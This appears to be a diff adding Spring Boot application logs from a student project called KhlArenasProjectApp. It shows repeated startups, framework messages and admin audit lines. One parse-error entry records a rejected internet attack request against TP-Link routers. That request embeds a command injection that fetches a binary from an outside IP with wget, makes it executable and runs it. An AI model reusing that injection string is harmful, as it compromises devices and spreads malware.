+06-05-2024 13:15:09 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:15:09 INFO  Root WebApplicationContext: initialization completed in 1337 ms
+06-05-2024 13:15:10 INFO  HikariPool-1 - Starting...
+06-05-2024 13:15:10 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 13:15:10 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:15:10 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:15:10 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:15:10 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:15:10 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:15:10 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:15:11 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:15:11 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:15:11 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:15:11 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:15:11 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 13:15:12 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:15:12 INFO  Started KhlArenasProjectApp in 4.073 seconds (process running for 4.353)
+06-05-2024 13:15:20 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:15:20 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:15:20 INFO  Completed initialization in 1 ms
+06-05-2024 13:15:23 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:20:06 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:20:06 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:20:06 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:20:11 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 45578 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:20:11 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:20:11 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:20:12 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:20:12 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:20:12 INFO  Starting service [Tomcat]
+06-05-2024 13:20:12 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 13:20:12 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:20:12 INFO  Root WebApplicationContext: initialization completed in 1258 ms
+06-05-2024 13:20:12 INFO  HikariPool-1 - Starting...
+06-05-2024 13:20:13 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 13:20:13 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:20:13 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:20:13 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:20:13 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:20:13 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:20:13 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:20:14 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:20:14 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:20:14 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:20:14 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:20:14 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 13:20:15 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:20:15 INFO  Started KhlArenasProjectApp in 4.134 seconds (process running for 4.418)
+06-05-2024 13:20:24 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:20:24 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:20:24 INFO  Completed initialization in 1 ms
+06-05-2024 13:20:26 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:25:36 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:25:36 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:25:36 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:25:39 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 46031 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:25:39 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:25:39 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:25:39 INFO  Finished Spring Data repository scanning in 55 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:25:40 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:25:40 INFO  Starting service [Tomcat]
+06-05-2024 13:25:40 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 13:25:40 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:25:40 INFO  Root WebApplicationContext: initialization completed in 1272 ms
+06-05-2024 13:25:40 INFO  HikariPool-1 - Starting...
+06-05-2024 13:25:40 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@265a094b
+06-05-2024 13:25:40 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:25:40 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:25:40 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:25:40 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:25:41 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:25:41 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:25:41 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:25:41 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:25:42 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:25:42 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:25:42 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@2f0e7008, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@307e9c02, org.springframework.security.web.context.SecurityContextHolderFilter@5776a9f8, org.springframework.security.web.header.HeaderWriterFilter@5eadc347, org.springframework.web.filter.CorsFilter@682270ff, org.springframework.security.web.authentication.logout.LogoutFilter@5b4ce00, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@550e7ef6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@446fb72e, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@26caf4b6, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6bc08a77, org.springframework.security.web.access.ExceptionTranslationFilter@70f0c352, org.springframework.security.web.access.intercept.AuthorizationFilter@3eadfbbb]
+06-05-2024 13:25:42 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:25:42 INFO  Started KhlArenasProjectApp in 4.034 seconds (process running for 4.34)
+06-05-2024 13:25:46 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:25:46 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:25:46 INFO  Completed initialization in 1 ms
+06-05-2024 13:25:49 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:25:59 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:32:32 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:47:59 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:47:59 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:47:59 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:48:01 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 47363 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:48:01 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:48:02 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:48:02 INFO  Finished Spring Data repository scanning in 45 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:48:02 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:48:02 INFO  Starting service [Tomcat]
+06-05-2024 13:48:02 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 13:48:02 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:48:02 INFO  Root WebApplicationContext: initialization completed in 1195 ms
+06-05-2024 13:48:03 INFO  HikariPool-1 - Starting...
+06-05-2024 13:48:03 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 13:48:03 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:48:03 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:48:03 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:48:03 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:48:03 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:48:03 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:48:04 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:48:04 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:48:04 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:48:04 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:48:05 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 13:48:05 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:48:05 INFO  Started KhlArenasProjectApp in 3.95 seconds (process running for 4.269)
+06-05-2024 13:48:14 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:48:14 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:48:14 INFO  Completed initialization in 1 ms
+06-05-2024 13:48:16 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 13:52:41 INFO  Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:264)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1736)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+06-05-2024 13:52:44 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:52:44 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 13:52:44 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 13:52:46 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 47967 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 13:52:46 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 13:52:47 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 13:52:47 INFO  Finished Spring Data repository scanning in 47 ms. Found 5 JPA repository interfaces.
+06-05-2024 13:52:48 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 13:52:48 INFO  Starting service [Tomcat]
+06-05-2024 13:52:48 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 13:52:48 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 13:52:48 INFO  Root WebApplicationContext: initialization completed in 1272 ms
+06-05-2024 13:52:48 INFO  HikariPool-1 - Starting...
+06-05-2024 13:52:48 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 13:52:48 INFO  HikariPool-1 - Start completed.
+06-05-2024 13:52:48 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 13:52:48 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 13:52:48 INFO  HHH000026: Second-level cache disabled
+06-05-2024 13:52:49 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 13:52:49 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 13:52:49 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 13:52:49 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 13:52:49 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 13:52:50 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 13:52:50 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 13:52:50 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 13:52:50 INFO  Started KhlArenasProjectApp in 4.004 seconds (process running for 4.304)
+06-05-2024 13:53:06 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 13:53:06 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 13:53:06 INFO  Completed initialization in 1 ms
+06-05-2024 13:53:09 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:00:30 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:00:30 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:00:30 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:00:33 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 48680 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:00:33 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:00:33 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:00:33 INFO  Finished Spring Data repository scanning in 50 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:00:34 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:00:34 INFO  Starting service [Tomcat]
+06-05-2024 14:00:34 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:00:34 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:00:34 INFO  Root WebApplicationContext: initialization completed in 1280 ms
+06-05-2024 14:00:34 INFO  HikariPool-1 - Starting...
+06-05-2024 14:00:35 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@265a094b
+06-05-2024 14:00:35 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:00:35 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:00:35 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:00:35 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:00:35 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:00:35 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:00:35 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:00:36 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:00:36 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:00:36 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:00:36 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@2f0e7008, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@307e9c02, org.springframework.security.web.context.SecurityContextHolderFilter@5776a9f8, org.springframework.security.web.header.HeaderWriterFilter@5eadc347, org.springframework.web.filter.CorsFilter@682270ff, org.springframework.security.web.authentication.logout.LogoutFilter@5b4ce00, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@550e7ef6, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@446fb72e, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@26caf4b6, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6bc08a77, org.springframework.security.web.access.ExceptionTranslationFilter@70f0c352, org.springframework.security.web.access.intercept.AuthorizationFilter@3eadfbbb]
+06-05-2024 14:00:36 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:00:36 INFO  Started KhlArenasProjectApp in 4.004 seconds (process running for 4.307)
+06-05-2024 14:00:39 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:00:39 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:00:39 INFO  Completed initialization in 2 ms
+06-05-2024 14:00:50 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:05:33 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:05:33 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:05:33 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:05:49 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 49355 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:05:49 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:05:49 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:05:49 INFO  Finished Spring Data repository scanning in 48 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:05:50 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:05:50 INFO  Starting service [Tomcat]
+06-05-2024 14:05:50 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:05:50 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:05:50 INFO  Root WebApplicationContext: initialization completed in 1213 ms
+06-05-2024 14:05:50 INFO  HikariPool-1 - Starting...
+06-05-2024 14:05:50 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@6274f21c
+06-05-2024 14:05:50 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:05:50 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:05:50 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:05:50 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:05:51 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:05:51 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:05:51 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:05:51 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:05:51 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:05:51 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:05:52 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@30cb489a, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@401d83ce, org.springframework.security.web.context.SecurityContextHolderFilter@7552f05b, org.springframework.security.web.header.HeaderWriterFilter@6889e714, org.springframework.web.filter.CorsFilter@3b7b099b, org.springframework.security.web.authentication.logout.LogoutFilter@6bc08a77, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@6250d33c, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@322593ed, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@67062a93, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@5abc488d, org.springframework.security.web.access.ExceptionTranslationFilter@22f0e329, org.springframework.security.web.access.intercept.AuthorizationFilter@498f1f63]
+06-05-2024 14:05:52 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:05:52 INFO  Started KhlArenasProjectApp in 3.887 seconds (process running for 4.199)
+06-05-2024 14:05:54 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:05:54 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:05:54 INFO  Completed initialization in 1 ms
+06-05-2024 14:05:56 INFO  Пользователь: admin вызвал метод: getAllMessages с параметрами: []
+06-05-2024 14:10:52 INFO  Closing JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:10:52 INFO  HikariPool-1 - Shutdown initiated...
+06-05-2024 14:10:52 INFO  HikariPool-1 - Shutdown completed.
+06-05-2024 14:10:55 INFO  Starting KhlArenasProjectApp using Java 21.0.2 with PID 49866 (/home/alex/Рабочий стол/Диплом/KHL_Arenas_Project/target/classes started by alex in /home/alex/Рабочий стол/Диплом/KHL_Arenas_Project)
+06-05-2024 14:10:55 INFO  No active profile set, falling back to 1 default profile: "default"
+06-05-2024 14:10:56 INFO  Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+06-05-2024 14:10:56 INFO  Finished Spring Data repository scanning in 56 ms. Found 5 JPA repository interfaces.
+06-05-2024 14:10:56 INFO  Tomcat initialized with port 8080 (http)
+06-05-2024 14:10:56 INFO  Starting service [Tomcat]
+06-05-2024 14:10:56 INFO  Starting Servlet engine: [Apache Tomcat/10.1.20]
+06-05-2024 14:10:56 INFO  Initializing Spring embedded WebApplicationContext
+06-05-2024 14:10:56 INFO  Root WebApplicationContext: initialization completed in 1239 ms
+06-05-2024 14:10:56 INFO  HikariPool-1 - Starting...
+06-05-2024 14:10:57 INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@1a7cb3a4
+06-05-2024 14:10:57 INFO  HikariPool-1 - Start completed.
+06-05-2024 14:10:57 INFO  HHH000204: Processing PersistenceUnitInfo [name: default]
+06-05-2024 14:10:57 INFO  HHH000412: Hibernate ORM core version 6.4.4.Final
+06-05-2024 14:10:57 INFO  HHH000026: Second-level cache disabled
+06-05-2024 14:10:57 INFO  No LoadTimeWeaver setup: ignoring JPA class transformer
+06-05-2024 14:10:57 WARN  HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+06-05-2024 14:10:58 INFO  HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+06-05-2024 14:10:58 INFO  Initialized JPA EntityManagerFactory for persistence unit 'default'
+06-05-2024 14:10:58 INFO  Hibernate is in classpath; If applicable, HQL parser will be used.
+06-05-2024 14:10:58 WARN  spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+06-05-2024 14:10:59 INFO  Will secure any request with [org.springframework.security.web.session.DisableEncodeUrlFilter@3a1e5fa7, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@7866fe3e, org.springframework.security.web.context.SecurityContextHolderFilter@209d0037, org.springframework.security.web.header.HeaderWriterFilter@5f6ba085, org.springframework.web.filter.CorsFilter@498f1f63, org.springframework.security.web.authentication.logout.LogoutFilter@550e7ef6, org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter@79735611, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3b39bee2, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@20ddc780, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@6250d33c, org.springframework.security.web.access.ExceptionTranslationFilter@29f114e0, org.springframework.security.web.access.intercept.AuthorizationFilter@4bdbfbc6]
+06-05-2024 14:10:59 INFO  Tomcat started on port 8080 (http) with context path ''
+06-05-2024 14:10:59 INFO  Started KhlArenasProjectApp in 4.081 seconds (process running for 4.37)
+06-05-2024 14:11:05 INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'
+06-05-2024 14:11:05 INFO  Initializing Servlet 'dispatcherServlet'
+06-05-2024 14:11:05 INFO  Completed initialization in 2 ms
